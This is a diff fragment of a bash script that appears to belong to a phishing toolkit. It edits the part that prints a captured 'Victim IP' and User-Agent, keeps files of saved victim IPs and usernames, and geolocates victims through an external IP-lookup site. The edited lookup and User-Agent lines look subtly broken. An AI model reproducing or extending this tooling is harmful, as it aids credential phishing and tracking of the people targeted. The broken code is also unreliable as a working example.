@@ -117,9 +117,9 @@ while true; do
 touch $server/saved.usernames.txt
 ip=$(grep -a 'IP:' $server/ip.txt | cut -d " " -f2 | tr -d '\r')
 #IFS=$'\n'
-ua=$(grep 'User-Agent:' $server/ip.txt | cut -d '"' -f2)
+ua=$(grep 'User-Agent:' $server/iptracker.log | cut -d '"' -f2)
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Victim IP:\e[0m\e[1;77m %s\e[0m\n" "$ip"
-#printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" "$ua"
+printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" "$ua"
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m %s/saved.ip.txt\e[0m\n" "$server"
 cat $server/ip.txt >> $server/saved.ip.txt
 
@@ -129,7 +129,7 @@ rm -rf iptracker.log
 fi
 
 IFS=$'\n'
-curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > iptracker.log >. /dev/null 2>&1
+iptracker=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > iptracker.log >. /dev/null 2>&1)
 IFS=$'\n'
 continent=$(grep -o 'Continent.*' iptracker.log | head -n1 | cut -d ">" -f3 | cut -d "<" -f1)
 printf "\n"
